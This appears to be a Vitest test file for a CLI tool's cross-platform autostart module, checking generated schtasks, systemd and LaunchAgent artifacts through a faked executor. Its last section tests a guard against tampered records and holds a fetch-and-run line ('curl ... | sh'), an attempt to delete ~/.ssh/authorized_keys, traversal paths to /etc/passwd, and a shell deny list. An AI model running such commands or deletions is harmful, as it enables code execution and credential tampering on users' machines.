import { describe, expect, it } from 'vitest';

import path from 'node:path';

import {
  planAutostart,
  registerAutostart,
  unregisterAutostart,
  autostartStatus,
  defaultAutostartRoots,
  isAllowedUnregisterCommand,
  isRemovableAutostartFile,
  normalizeAutostartPath,
  type AutostartOpts,
  type AutostartEffects,
  type AutostartCommand,
  type SpawnResult,
} from '../../src/cli/autostart.js';

// Task 2.3.2 — planAutostart is pure (no fs/process reads), so every
// platform's exact file content and commands are snapshot-checkable for
// fixed inputs. registerAutostart/unregisterAutostart/autostartStatus are
// exercised ONLY through a faked executor (spawn recorder + an in-memory
// fs map) — zero real registrations, zero real spawns, on any OS.

// Review finding 2: each platform gets its OWN self-consistent, platform-
// shaped fixture (a win32 plan must never see a posix homeDir, and vice
// versa — mixing them let a real defect hide behind an unrealistic snapshot),
// and EVERY fixture carries a space in a path segment that lands in a
// generated artifact, so the win32 schtasks /TR quoting and the systemd
// ExecStart/Environment quoting are actually exercised, not just plausible.
// The darwin fixture also carries a literal `&`, exercising the plist's
// XML-escaping fix (the raw file path used for `launchctl load/unload`
// must NOT be escaped — only the plist's XML text content).

const WIN32_OPTS: AutostartOpts = {
  nodePath: 'C:\\Program Files\\nodejs\\node.exe',
  serverEntry: 'C:\\Users\\John Smith\\.kopeng\\app\\node_modules\\kopeng\\dist\\server.js',
  kopengHome: 'C:\\Users\\John Smith\\.kopeng',
  envFile: 'C:\\Users\\John Smith\\.kopeng\\.env',
  homeDir: 'C:\\Users\\John Smith',
  appDataDir: 'C:\\Users\\John Smith\\AppData\\Roaming',
};

const LINUX_OPTS: AutostartOpts = {
  nodePath: '/usr/bin/node',
  serverEntry: '/home/user name/.kopeng/app/node_modules/kopeng/dist/server.js',
  kopengHome: '/home/user name/.kopeng',
  envFile: '/home/user name/.kopeng/.env',
  homeDir: '/home/user name',
  appDataDir: '/home/user name/AppData/Roaming', // unused by the linux plan
};

const DARWIN_OPTS: AutostartOpts = {
  nodePath: '/usr/local/bin/node',
  serverEntry: '/Users/Q&A user/.kopeng/app/node_modules/kopeng/dist/server.js',
  kopengHome: '/Users/Q&A user/.kopeng',
  envFile: '/Users/Q&A user/.kopeng/.env',
  homeDir: '/Users/Q&A user',
  appDataDir: '/Users/Q&A user/AppData/Roaming', // unused by the darwin plan
};

describe('planAutostart — win32', () => {
  const plan = planAutostart('win32', WIN32_OPTS);

  it('writes the .cmd shim (sets env, launches node) and the .vbs shim (runs it hidden)', () => {
    expect(plan.files).toEqual([
      {
        path: 'C:\\Users\\John Smith\\.kopeng\\autostart\\kopeng-server.cmd',
        content:
          '@echo off\r\n' +
          'cd /d "C:\\Users\\John Smith\\.kopeng"\r\n' +
          'set "KOPENG_ENV_FILE=C:\\Users\\John Smith\\.kopeng\\.env"\r\n' +
          'set "KOPENG_HOME=C:\\Users\\John Smith\\.kopeng"\r\n' +
          '"C:\\Program Files\\nodejs\\node.exe" "C:\\Users\\John Smith\\.kopeng\\app\\node_modules\\kopeng\\dist\\server.js"\r\n',
      },
      {
        path: 'C:\\Users\\John Smith\\.kopeng\\autostart\\kopeng-server.vbs',
        content:
          'Set objShell = CreateObject("WScript.Shell")\r\n' +
          'objShell.Run """C:\\Users\\John Smith\\.kopeng\\autostart\\kopeng-server.cmd""", 0, False\r\n',
      },
    ]);
  });

  it('registers via schtasks /Create ONLOGON, targeting the QUOTED vbs path through wscript //B', () => {
    expect(plan.mechanism).toBe('win32-schtasks');
    expect(plan.taskName).toBe('kopeng-server');
    expect(plan.registerCommands).toEqual<AutostartCommand[]>([
      {
        command: 'schtasks',
        args: ['/Create', '/F', '/SC', 'ONLOGON', '/TN', 'kopeng-server', '/TR',
          'wscript.exe //B "C:\\Users\\John Smith\\.kopeng\\autostart\\kopeng-server.vbs"'],
      },
    ]);
    expect(plan.unregisterCommands).toEqual<AutostartCommand[]>([
      { command: 'schtasks', args: ['/Delete', '/F', '/TN', 'kopeng-server'] },
    ]);
  });

  it('falls back to copying the SAME vbs content into the user Startup folder', () => {
    expect(plan.fallback?.mechanism).toBe('win32-startup-folder');
    expect(plan.fallback?.files).toEqual([{
      path: 'C:\\Users\\John Smith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\kopeng-server.vbs',
      content: plan.files[1].content,
    }]);
    expect(plan.fallback?.registerCommands).toEqual([]);
    expect(plan.fallback?.unregisterCommands).toEqual([]);
  });
});

describe('planAutostart — linux', () => {
  const plan = planAutostart('linux', LINUX_OPTS);

  it('writes a systemd --user unit with QUOTED ExecStart + Environment lines', () => {
    expect(plan.mechanism).toBe('linux-systemd-user');
    expect(plan.files).toEqual([{
      path: '/home/user name/.config/systemd/user/kopeng.service',
      content:
        '[Unit]\n' +
        'Description=KOPENG server (user-level autostart)\n' +
        'After=network.target\n' +
        '\n' +
        '[Service]\n' +
        'Type=simple\n' +
        'WorkingDirectory="/home/user name/.kopeng"\n' +
        'ExecStart="/usr/bin/node" "/home/user name/.kopeng/app/node_modules/kopeng/dist/server.js"\n' +
        'Environment="KOPENG_ENV_FILE=/home/user name/.kopeng/.env"\n' +
        'Environment="KOPENG_HOME=/home/user name/.kopeng"\n' +
        'Restart=on-failure\n' +
        '\n' +
        '[Install]\n' +
        'WantedBy=default.target\n',
    }]);
  });

  it('registers via daemon-reload then enable --now, unregisters via disable --now', () => {
    expect(plan.registerCommands).toEqual<AutostartCommand[]>([
      { command: 'systemctl', args: ['--user', 'daemon-reload'] },
      { command: 'systemctl', args: ['--user', 'enable', '--now', 'kopeng'] },
    ]);
    expect(plan.unregisterCommands).toEqual<AutostartCommand[]>([
      { command: 'systemctl', args: ['--user', 'disable', '--now', 'kopeng'] },
    ]);
  });

  it('has a note-only fallback (no user systemd) that never fails registration', () => {
    expect(plan.fallback?.mechanism).toBe('linux-none');
    expect(plan.fallback?.files).toEqual([]);
    expect(plan.fallback?.registerCommands).toEqual([]);
    expect(plan.fallback?.note).toMatch(/no user systemd/);
    expect(plan.fallback?.note).toMatch(/kopeng ensure/);
  });
});

describe('planAutostart — darwin', () => {
  const plan = planAutostart('darwin', DARWIN_OPTS);

  it('writes a LaunchAgent plist with RunAtLoad true, KeepAlive false, and XML-escaped paths', () => {
    expect(plan.mechanism).toBe('darwin-launchagent');
    expect(plan.files).toHaveLength(1);
    expect(plan.files[0].path).toBe('/Users/Q&A user/Library/LaunchAgents/net.kopeng.server.plist');
    expect(plan.files[0].content).toContain('<key>RunAtLoad</key>\n  <true/>');
    expect(plan.files[0].content).toContain('<key>KeepAlive</key>\n  <false/>');
    expect(plan.files[0].content).toContain('<string>/usr/local/bin/node</string>');
    // The literal `&` in the fixture path must be escaped to `&amp;` inside
    // the plist's XML text content...
    expect(plan.files[0].content).toContain('<string>/Users/Q&amp;A user/.kopeng/app/node_modules/kopeng/dist/server.js</string>');
    expect(plan.files[0].content).toContain('<string>/Users/Q&amp;A user/.kopeng/.env</string>');
    expect(plan.files[0].content).toContain('<string>/Users/Q&amp;A user/.kopeng</string>');
    expect(plan.files[0].content).toContain('<key>WorkingDirectory</key>\n  <string>/Users/Q&amp;A user/.kopeng</string>');
    // ...and the raw, unescaped "Q&A" sequence must not survive anywhere in
    // the XML content (it does survive in the file PATH itself, checked
    // separately below — this assertion is scoped to plist content only).
    expect(plan.files[0].content).not.toContain('Q&A');
  });

  it('registers/unregisters via launchctl load/unload with the RAW (non-escaped) file path, and has no fallback', () => {
    // launchctl gets a real filesystem path (a spawn argv element, never
    // XML-parsed) — the raw `&` must survive here even though the plist
    // CONTENT above escapes it.
    expect(plan.registerCommands).toEqual<AutostartCommand[]>([
      { command: 'launchctl', args: ['load', '/Users/Q&A user/Library/LaunchAgents/net.kopeng.server.plist'] },
    ]);
    expect(plan.unregisterCommands).toEqual<AutostartCommand[]>([
      { command: 'launchctl', args: ['unload', '/Users/Q&A user/Library/LaunchAgents/net.kopeng.server.plist'] },
    ]);
    expect(plan.fallback).toBeUndefined();
  });
});

// ── register/unregister/status over a faked executor ───────────────────────

function fakeEffects(spawnResult: (command: string, args: string[]) => SpawnResult = () => ({ status: 0 })) {
  const files = new Map<string, string>();
  const spawnCalls: AutostartCommand[] = [];
  const effects: AutostartEffects = {
    spawn: (command, args) => {
      spawnCalls.push({ command, args });
      return spawnResult(command, args);
    },
    fs: {
      writeFile: (filePath, content) => { files.set(filePath, content); },
      readFile: (filePath) => files.get(filePath),
      remove: (filePath) => { files.delete(filePath); },
    },
  };
  return { effects, files, spawnCalls };
}

// Opaque record-file key for the fake fs — never path-joined by the code
// under test, so it carries no platform semantics of its own.
const RECORD_PATH = '/test/autostart-record.json';

// Fix round 2 (Finding 2): unregisterAutostart now checks every recorded
// file against an allowlist of the four directories planAutostart can
// produce. The roots are passed explicitly here because these fixtures are
// deliberately platform-FOREIGN (the win32 record is exercised on a linux
// runner and the linux one on Windows), so the host-derived defaults
// (os.homedir()/%APPDATA%) could never match them — and because RECORD_PATH
// is an opaque fake-fs key, not the fixture's real install root.
function rootsFor(opts: AutostartOpts): string[] {
  return defaultAutostartRoots(path.join(opts.kopengHome, 'autostart.json'), opts.homeDir, opts.appDataDir);
}

describe('registerAutostart / unregisterAutostart symmetry (faked executor)', () => {
  it('linux: writes the unit file, runs both register commands, records the primary mechanism', () => {
    const { effects, files, spawnCalls } = fakeEffects();
    const plan = planAutostart('linux', LINUX_OPTS);

    const record = registerAutostart(plan, effects, RECORD_PATH);

    expect(record.usedFallback).toBe(false);
    expect(record.mechanism).toBe('linux-systemd-user');
    expect(record.files).toEqual(['/home/user name/.config/systemd/user/kopeng.service']);
    expect(spawnCalls).toEqual([
      { command: 'systemctl', args: ['--user', 'daemon-reload'] },
      { command: 'systemctl', args: ['--user', 'enable', '--now', 'kopeng'] },
    ]);
    expect(files.get('/home/user name/.config/systemd/user/kopeng.service')).toContain('[Unit]');
    expect(JSON.parse(files.get(RECORD_PATH)!)).toMatchObject({ mechanism: 'linux-systemd-user' });

    // Unregister reverses exactly what was recorded — no original plan needed.
    spawnCalls.length = 0;
    const result = unregisterAutostart(effects, RECORD_PATH, { allowedRoots: rootsFor(LINUX_OPTS) });

    expect(result.reversed).toBe(true);
    expect(result.refused).toBeUndefined();
    expect(spawnCalls).toEqual([{ command: 'systemctl', args: ['--user', 'disable', '--now', 'kopeng'] }]);
    expect(files.has('/home/user name/.config/systemd/user/kopeng.service')).toBe(false);
    expect(files.has(RECORD_PATH)).toBe(false);
  });

  it('darwin: register then unregister removes the plist and clears the record', () => {
    const { effects, files } = fakeEffects();
    const plan = planAutostart('darwin', DARWIN_OPTS);

    registerAutostart(plan, effects, RECORD_PATH);
    expect(files.has('/Users/Q&A user/Library/LaunchAgents/net.kopeng.server.plist')).toBe(true);

    unregisterAutostart(effects, RECORD_PATH, { allowedRoots: rootsFor(DARWIN_OPTS) });
    expect(files.has('/Users/Q&A user/Library/LaunchAgents/net.kopeng.server.plist')).toBe(false);
    expect(files.has(RECORD_PATH)).toBe(false);
  });

  it('unregisterAutostart with no record file is a no-op, not an error', () => {
    const { effects } = fakeEffects();
    expect(unregisterAutostart(effects, RECORD_PATH)).toEqual({ reversed: false });
  });

  it('unregisterAutostart with a malformed record cannot reverse anything, but still removes the record file itself (fix round 1, Finding 6a)', () => {
    const { effects, files } = fakeEffects();
    files.set(RECORD_PATH, '{ not json');
    expect(unregisterAutostart(effects, RECORD_PATH)).toEqual({ reversed: false, malformed: true });
    // Left behind forever pre-fix — a corrupt record with no way to name what
    // it once registered is worse than an honest "not registered" going
    // forward, and it must not linger un-actionable.
    expect(files.has(RECORD_PATH)).toBe(false);
  });
});

describe('win32 schtasks-fails -> Startup-folder fallback (faked executor)', () => {
  it('falls back when schtasks /Create exits non-zero, and records the fallback mechanism', () => {
    const { effects, files, spawnCalls } = fakeEffects((command) =>
      command === 'schtasks' ? { status: 1 } : { status: 0 }
    );
    const plan = planAutostart('win32', WIN32_OPTS);

    const record = registerAutostart(plan, effects, RECORD_PATH);

    expect(record.usedFallback).toBe(true);
    expect(record.mechanism).toBe('win32-startup-folder');
    // Both the original shim files AND the Startup-folder copy are recorded,
    // so unregister cleans up everything that was actually written.
    expect(record.files).toEqual([
      'C:\\Users\\John Smith\\.kopeng\\autostart\\kopeng-server.cmd',
      'C:\\Users\\John Smith\\.kopeng\\autostart\\kopeng-server.vbs',
      'C:\\Users\\John Smith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\kopeng-server.vbs',
    ]);
    expect(record.unregisterCommands).toEqual([]);
    expect(spawnCalls).toEqual([{ command: 'schtasks', args: expect.any(Array) }]);
    expect(files.has('C:\\Users\\John Smith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\kopeng-server.vbs')).toBe(true);

    // Unregister reverses the FALLBACK record, not the primary schtasks path
    // (no schtasks /Delete call — nothing was ever scheduled).
    spawnCalls.length = 0;
    const result = unregisterAutostart(effects, RECORD_PATH, { allowedRoots: rootsFor(WIN32_OPTS) });
    expect(result.reversed).toBe(true);
    expect(result.refused).toBeUndefined();
    expect(spawnCalls).toEqual([]);
    expect(files.has('C:\\Users\\John Smith\\.kopeng\\autostart\\kopeng-server.cmd')).toBe(false);
    expect(files.has('C:\\Users\\John Smith\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\kopeng-server.vbs')).toBe(false);
  });

  it('succeeds via schtasks when it exits 0 — no fallback used', () => {
    const { effects } = fakeEffects(() => ({ status: 0 }));
    const plan = planAutostart('win32', WIN32_OPTS);

    const record = registerAutostart(plan, effects, RECORD_PATH);

    expect(record.usedFallback).toBe(false);
    expect(record.mechanism).toBe('win32-schtasks');
    expect(record.taskName).toBe('kopeng-server');
  });

  it('a spawn error (schtasks missing) also triggers the fallback', () => {
    const { effects } = fakeEffects((command) =>
      command === 'schtasks' ? { status: null, error: new Error('ENOENT') } : { status: 0 }
    );
    const plan = planAutostart('win32', WIN32_OPTS);

    const record = registerAutostart(plan, effects, RECORD_PATH);
    expect(record.usedFallback).toBe(true);
    expect(record.mechanism).toBe('win32-startup-folder');
  });
});

describe('autostartStatus (faked executor)', () => {
  it('reports not registered when no record exists', () => {
    const { effects } = fakeEffects();
    expect(autostartStatus(effects, RECORD_PATH)).toEqual({ registered: false, record: null });
  });

  it('reports registered + queries schtasks for a win32-schtasks record', () => {
    const { effects, spawnCalls } = fakeEffects(() => ({ status: 0 }));
    const plan = planAutostart('win32', WIN32_OPTS);
    registerAutostart(plan, effects, RECORD_PATH);

    spawnCalls.length = 0;
    const status = autostartStatus(effects, RECORD_PATH);

    expect(status.registered).toBe(true);
    expect(status.record?.mechanism).toBe('win32-schtasks');
    expect(status.schtasksQueryStatus).toBe(0);
    expect(spawnCalls).toEqual([{ command: 'schtasks', args: ['/Query', '/TN', 'kopeng-server'] }]);
  });

  it('does not query schtasks for a non-win32 record', () => {
    const { effects, spawnCalls } = fakeEffects(() => ({ status: 0 }));
    const plan = planAutostart('linux', LINUX_OPTS);
    registerAutostart(plan, effects, RECORD_PATH);

    spawnCalls.length = 0;
    const status = autostartStatus(effects, RECORD_PATH);

    expect(status.schtasksQueryStatus).toBeUndefined();
    expect(spawnCalls).toEqual([]);
  });
});

// ── Untrusted-record guard (fix round 2, Finding 2) ────────────────────────
//
// unregisterAutostart used to spawn every recorded command and delete every
// recorded file VERBATIM out of ~/.kopeng/autostart.json — an unvalidated
// exec/delete primitive that only fires when the operator runs a routine,
// trusted-looking `kopeng uninstall`. The record is untrusted input now.

describe('normalizeAutostartPath', () => {
  it('folds both separators and resolves `..` away, so a traversal cannot escape a root', () => {
    expect(normalizeAutostartPath('C:\\Users\\Jo\\.kopeng\\..\\..\\Windows\\System32'))
      .toBe('c:/users/windows/system32');
    expect(normalizeAutostartPath('/home/op/.kopeng/./autostart/../x')).toBe('/home/op/.kopeng/x');
  });

  it('is host-independent — a win32 record normalizes the same on any runner', () => {
    expect(normalizeAutostartPath('C:\\A\\B')).toBe(normalizeAutostartPath('c:/a/b'));
  });
});

describe('isAllowedUnregisterCommand', () => {
  it('accepts exactly the three schedulers planAutostart drives', () => {
    for (const command of ['schtasks', 'systemctl', 'launchctl']) {
      expect(isAllowedUnregisterCommand(command)).toBe(true);
    }
  });

  it('rejects anything else, including the shells a tampered record would reach for', () => {
    for (const command of ['sh', 'cmd', 'powershell', 'curl', 'node', 'rm', '']) {
      expect(isAllowedUnregisterCommand(command)).toBe(false);
    }
  });
});

describe('isRemovableAutostartFile', () => {
  const roots = rootsFor(LINUX_OPTS);

  it('accepts a file under the install root or the systemd --user unit dir', () => {
    expect(isRemovableAutostartFile('/home/user name/.kopeng/autostart/shim.sh', roots)).toBe(true);
    expect(isRemovableAutostartFile('/home/user name/.config/systemd/user/kopeng.service', roots)).toBe(true);
  });

  it('rejects a path outside every root', () => {
    expect(isRemovableAutostartFile('/etc/passwd', roots)).toBe(false);
    expect(isRemovableAutostartFile('/home/user name/Documents/taxes.pdf', roots)).toBe(false);
  });

  it('rejects a `..` traversal dressed up as an in-root path', () => {
    expect(isRemovableAutostartFile('/home/user name/.kopeng/../../../etc/passwd', roots)).toBe(false);
  });

  it('never treats the filesystem root as a root, whatever is passed', () => {
    expect(isRemovableAutostartFile('/etc/passwd', ['/'])).toBe(false);
    expect(isRemovableAutostartFile('/etc/passwd', [''])).toBe(false);
  });
});

describe('unregisterAutostart refuses a tampered record', () => {
  it('does not spawn a foreign command, and reports the refusal instead of skipping it silently', () => {
    const { effects, files, spawnCalls } = fakeEffects();
    files.set(RECORD_PATH, JSON.stringify({
      mechanism: 'linux-systemd-user',
      files: [],
      unregisterCommands: [
        { command: 'sh', args: ['-c', 'curl https://192.0.2.10/x | sh'] },
        { command: 'systemctl', args: ['--user', 'disable', '--now', 'kopeng'] },
      ],
    }));

    const result = unregisterAutostart(effects, RECORD_PATH, { allowedRoots: rootsFor(LINUX_OPTS) });

    // The legitimate command still runs — the guard is a filter, not a halt.
    expect(spawnCalls).toEqual([{ command: 'systemctl', args: ['--user', 'disable', '--now', 'kopeng'] }]);
    expect(result.reversed).toBe(true);
    expect(result.refused).toHaveLength(1);
    expect(result.refused?.[0]).toMatch(/refused to run the recorded command "sh"/);
  });

  it('does not delete a file outside the allowed roots, and reports it', () => {
    const { effects, files } = fakeEffects();
    files.set('/home/user name/.ssh/authorized_keys', 'ssh-ed25519 AAAA');
    files.set('/home/user name/.config/systemd/user/kopeng.service', '[Unit]');
    files.set(RECORD_PATH, JSON.stringify({
      mechanism: 'linux-systemd-user',
      files: ['/home/user name/.ssh/authorized_keys', '/home/user name/.config/systemd/user/kopeng.service'],
      unregisterCommands: [],
    }));

    const result = unregisterAutostart(effects, RECORD_PATH, { allowedRoots: rootsFor(LINUX_OPTS) });

    expect(files.has('/home/user name/.ssh/authorized_keys')).toBe(true);
    expect(files.has('/home/user name/.config/systemd/user/kopeng.service')).toBe(false);
    expect(result.refused).toHaveLength(1);
    expect(result.refused?.[0]).toMatch(/refused to delete the recorded file ".*authorized_keys"/);
    // The record itself always goes: leaving one we have just decided not to
    // trust is strictly worse than removing it and naming what we refused.
    expect(files.has(RECORD_PATH)).toBe(false);
  });
});
